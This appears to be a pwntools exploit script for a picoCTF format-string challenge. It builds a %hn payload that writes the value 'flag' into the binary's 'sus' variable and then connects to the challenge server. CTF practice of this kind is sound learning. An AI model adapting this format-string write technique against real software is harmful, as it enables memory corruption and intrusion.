#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 61946
HOST = "rhea.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x401255
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

tg = 0x67616c66
part1 = tg & 0xffff
part2 = tg >> 16 & 0xffff

fmt = f"%{part2}c%18$hn".encode()
fmt += f"%{part1 - part2}c%19$hn".encode()
pl = flat(
	fmt.ljust(0x20, b"A"),
	exe.sym.sus+2,
	exe.sym.sus
	)
# GDB()
p.sendlineafter(b"say?\n", pl)

p.interactive()
